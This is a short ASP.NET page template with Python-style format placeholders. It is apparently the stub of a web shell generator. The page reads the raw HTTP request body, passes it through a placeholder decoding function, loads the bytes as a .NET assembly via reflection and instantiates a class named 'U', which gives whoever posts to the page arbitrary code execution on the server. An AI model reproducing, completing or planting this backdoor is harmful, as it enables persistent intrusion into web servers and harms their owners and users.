<%%@ Page Language="C#" %%>
    <%%@Import Namespace="System.Reflection" %%>
    <script runat="server">

       %s


    </script>
        <%%
        byte[] c=Request.BinaryRead(Request.ContentLength);Assembly.Load(%s(c)).CreateInstance("U").Equals(this);
        %%>